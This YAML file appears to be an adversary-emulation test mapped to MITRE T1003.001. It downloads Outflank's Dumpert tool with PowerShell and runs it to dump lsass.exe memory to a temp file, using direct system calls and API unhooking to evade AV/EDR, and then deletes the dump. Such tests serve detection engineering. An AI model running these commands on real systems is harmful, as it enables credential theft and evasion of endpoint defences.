api_version: "2.0"
name: Dump LSASS.exe Memory using direct system calls and API unhooking
description: "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n"
args:
    - name: dumpert_exe
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe
uuid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.001: LSASS Memory'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Dumpert executable must exist on disk at specified location (#{dumpert_exe})
      inline: |
        if (Test-Path "#{dumpert_exe}") {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        New-Item -ItemType Directory (Split-Path "#{dumpert_exe}") -Force | Out-Null
        Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile "#{dumpert_exe}"
        }}
      executor: powershell
    - name: dump-lsass.exe-memory-using-direct-system-calls-and-api-unhooking
      inline: |
        "{{.Args.dumpert_exe}}"
      executor: command_prompt
      cleanup:
        inline: |
            del C:\windows\temp\dumpert.dmp >nul 2> nul
        executor: command_prompt
